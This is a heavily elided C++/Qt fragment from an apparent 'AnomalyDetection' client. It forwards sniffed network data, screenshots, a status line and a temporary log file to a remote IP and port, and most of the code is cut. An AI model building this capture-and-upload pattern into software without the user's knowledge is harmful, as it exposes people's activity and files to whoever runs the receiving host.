...
namespace AnomalyDetection
{
        ...
        fileClient{std::make_unique<FileClient>(this, _ip, _destPort)}
    {
        ...
        connect(sniffer.get(), &Sniffer::newData, [this](const QString& data){
            fileClient->enqueueDataAndConnect(std::make_unique<String>("DATA|" + data));
        });
        ...
        {
            //Send screenshot
            fileClient->enqueueDataAndConnect(std::make_unique<File>(path + "/screens/" + screenName));
        });
    ...
    {
        //Queue string
        fileClient->enqueueDataAndConnect(std::make_unique<String>("ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) ));
    ...
    */
    void Client::enqueueLog()
    {
        ...
        *conn = QObject::connect(fileClient.get(), &FileClient::transmitted, [this, conn]()
        ...
        //Send log
        fileClient->enqueueDataAndConnect(std::make_unique<File>(path + "/data_tmp.log"));
    }
}
